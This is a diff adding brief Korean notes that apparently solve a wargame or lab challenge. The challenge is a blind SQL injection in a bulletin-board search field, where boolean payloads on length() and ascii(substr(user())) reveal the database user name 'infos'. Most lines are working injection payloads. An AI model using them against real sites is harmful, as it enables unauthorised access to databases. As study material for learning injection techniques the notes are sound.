@@ -1,0 +1,31 @@
+1. 쿼리문 유추
+select * from 자유게시판 where 제목 like '%_검색_%'
+
+2. 공격 포인트
+a' -> 검색했는데 에러가 뜸
+_검색_ : a' and '%'=' --> 게시글이 나오면 안되는데 게시글이 나온다.
+    공격 쿼리: a' and _공격쿼리_ and '%'='
+
+3. 유저명
+select user()
+    3-1. 유저명 길이 찾기: 19
+        (select length(user()))=3
+        > a' and (select length(user()))=3 and '%'='
+    3-2. 유저명 찾기: 105,110,102,111,115,64(@) -> 여기까지가 유저명, 뒤에는 ip
+        (select ascii(substr(user(),1,1)))=90
+        > a' and (select ascii(substr(user(),1,1)))>0 and '%'='
+    3-3. 파이썬으로 아스키->문자 바꾸기
+        >>> chr(105)
+        'i'
+        >>> chr(110)
+        'n'
+        >>> chr(102)
+        'f'
+        >>> chr(111)
+        'o'
+        >>> chr(115)
+        's'
+        >>> chr(64)
+        '@'
+
+[답] infos
